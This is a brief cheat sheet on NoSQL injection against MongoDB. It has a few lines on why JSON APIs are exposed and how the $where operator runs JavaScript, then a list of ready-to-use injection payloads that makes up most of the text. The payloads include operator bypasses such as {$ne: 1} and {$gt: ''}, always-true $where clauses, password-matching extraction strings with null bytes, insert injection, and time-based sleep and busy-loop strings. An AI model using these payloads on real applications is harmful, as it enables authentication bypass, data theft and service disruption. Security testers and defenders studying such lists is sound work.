NoSQLi


--queries execute within a procedural language, rather than in declarative SQL language
--often less mitigation when attacking through REST API
	--filtering of common HTML special characters < > & ; will not prevent attacks against a JSON API, where special characters include / { } : 


MongoDB
	--$where operator typically is used as a simple filter or check
		db.myCollection.find( { $where: "this.here == this.there" } );
	--JavaScript may also evaluate
		db.myCollection.find( { $where: function() { return obj.here - obj.there < 0; } } );

Escape Chars:
	' " \ ; { }

Payloads:
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';sleep(5000);
';sleep(5000);'
';sleep(5000);+'
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);

